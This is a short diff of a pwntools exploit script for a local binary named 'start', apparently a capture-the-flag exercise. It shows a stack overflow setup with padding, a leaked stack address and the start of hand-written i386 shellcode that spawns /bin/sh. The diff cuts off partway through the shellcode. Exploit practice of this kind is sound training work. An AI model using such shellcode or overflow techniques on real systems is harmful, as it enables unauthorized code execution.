@@ -1,7 +1,7 @@
 #!/usr/bin/python
 from pwn import *
 
-context.log_level = 'debug'
+#context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
 p = process('./start')
 print 'pid:' + str(proc.pidof(p))
@@ -20,6 +20,7 @@ def getLeaf():
 padding1 = 20*'a'
 gad = getLeaf() + 20
 print '$esp = ' + hex(gad-20)
+#shellcode = asm(shellcraft.i386.linux.sh())
 shellcode = asm('\n'.join([
     'push %d' % u32('/sh\0'),
     'push %d' % u32('/bin'),
